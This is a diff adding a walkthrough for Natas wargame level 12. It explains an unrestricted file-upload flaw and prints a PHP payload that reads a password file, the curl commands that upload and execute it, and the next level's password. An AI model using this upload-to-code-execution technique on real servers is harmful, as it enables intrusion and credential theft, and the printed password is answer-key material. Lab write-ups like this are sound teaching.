@@ -164,3 +164,17 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Verification:** `http://natas12.natas.labs.overthewire.org/` with `natas12:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L11.cast`
 
+## Level 12 → natas13
+- **Account:** `natas12`.
+- **Goal:** Upload a JPEG (max 1 KB) and retrieve natas13's password.
+- **Technique and why it works:** The upload handler builds the stored path from the client-supplied `filename` POST field: `makeRandomPathFromFilename("upload", $_POST["filename"])` takes the extension from that field, so the random prefix does not matter. By sending `filename=shell.php`, the uploaded bytes are stored as `upload/<random>.php` and are executed as PHP by the server. There is no content-type or image validation in this level. The PHP payload prints the contents of `/etc/natas_webpass/natas13`; requesting the returned upload URL executes it and returns the password. This is an unrestricted file upload → remote code execution.
+- **Commands:**
+  ```
+  printf '<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > /tmp/shell.php
+  curl -s -u natas12:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell.php;type=image/jpeg' http://natas12.natas.labs.overthewire.org/index.php
+  curl -s -u natas12:<pw> http://natas12.natas.labs.overthewire.org/upload/<random>.php
+  ```
+- **Password for natas13:** `g8ba0olAzaSJuyS4gnmbdVVigAICLG1k`
+- **Verification:** `http://natas13.natas.labs.overthewire.org/` with `natas13:<password>` → HTTP 200.
+- **Recording:** `recordings/natas/L12.cast`
+
